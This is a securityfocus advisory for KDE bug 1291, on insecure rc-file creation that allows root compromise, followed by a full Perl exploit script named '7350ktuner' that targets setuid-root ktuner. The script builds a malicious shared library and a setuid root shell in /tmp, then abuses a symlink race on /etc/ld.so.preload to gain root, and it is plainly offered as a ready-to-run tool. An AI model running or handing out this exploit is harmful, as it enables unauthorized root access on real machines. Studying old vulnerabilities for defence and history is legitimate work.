source: http://www.securityfocus.com/bid/1291/info
 
The KDE configuration-file management has a bug which could result in root compromise.
 
Due to insecure creation of configuration (rc) files via KApplication-class, local users can modify ownership of arbitrary files when running setuid root KDE-programs.
 
Properly exploited, this can permit a local attacker to change ownership of key system files, then write arbitrary data to them, allowing an elevation of privileges.

#!/usr/bin/perl

#
# 7350ktuner! The ktuner-hack. 
# (a.k.a. kil3r for some reason :)
#
# Just execute. Gives instant rootshell kiddie!
# If only ktuner is setuid-root and vulnerable as with
# SuSE 6.4!
#
# When has this stupid race an end?
#
# Bugdiscovery is due to Sebastian Krahmer.
# http://www.cs.uni-potsdam.de/homepages/students/linuxer
#
#
# Greets as always to TESO, security.is, lam3rz ... you all
# know who you are.
#
# 

my $rcfile = $ENV{"HOME"}."/.kde/share/config/ktunerrc";

$ENV{"PATH"}.=":/opt/kde/bin";

print ">>Get a feeling on GUI's and how secure they are.<< Stealth.\n";

print "Creating hijack-lib ...\n";
open O, ">/tmp/boom.c" or die "open(boom.c..)";
print O<<_EOF_;
#include <sys/types.h>

int time(void *v)
{
	chown("/tmp/boomsh", 0, 0);
	chmod("/tmp/boomsh", 06755);
	unlink("/etc/ld.so.preload");
	exit(1);
}
_EOF_
close O;

print "Compiling hijack-lib ...\n";
`cc -c -fPIC /tmp/boom.c -o /tmp/boom.o`;
`cc -shared /tmp/boom.o -o /tmp/boom.so`;

open O, ">/tmp/boomsh.c" or die "open(boomsh.c ...)";
print O<<_EOF2_;
#include <stdio.h>
int main() 
{
    char *a[] = {"/bin/sh", 0};
    setuid(0); setregid(0, 0);
    execve(a[0], a, 0);
    return 0;
}
_EOF2_
close O;

print "Compile shell ...\n";
`cc /tmp/boomsh.c -o /tmp/boomsh`;

umask 0;

unlink $rcfile;
symlink "/etc/ld.so.preload", $rcfile;

print "Invoking vulnerable program (ktuner)...\n";

if (fork() == 0) {
	`ktuner`;
	exit 0;
} else {
	sleep(3);
	kill 9, `pidof ktuner`;
}

open O, ">/etc/ld.so.preload" or die "Huh? Can't open preload.";
print O "/tmp/boom.so";
close O;
`/usr/bin/passwd`;

# let it look like if we have sth. to do. :)
sleep 3;
print "Welcome. But as always: BEHAVE!\n";
system("/tmp/boomsh");